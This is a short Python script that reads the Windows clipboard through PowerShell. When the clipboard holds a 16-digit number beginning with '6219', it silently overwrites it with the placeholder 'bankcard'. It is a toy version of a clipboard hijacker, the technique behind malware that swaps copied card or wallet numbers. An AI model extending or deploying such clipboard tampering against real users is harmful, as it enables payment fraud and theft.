from subprocess import getoutput

getclp = getoutput("powershell -NoProfile -command get-clipboard")

#if getclp == "123456789":
if getclp.startswith("6219") and len(getclp) == 16:
    getoutput("powershell -NoProfile -command set-clipboard 'bankcard'")
    getclp = getoutput("powershell -NoProfile -command get-clipboard")

if __name__ == "__main__":
    print(getclp)


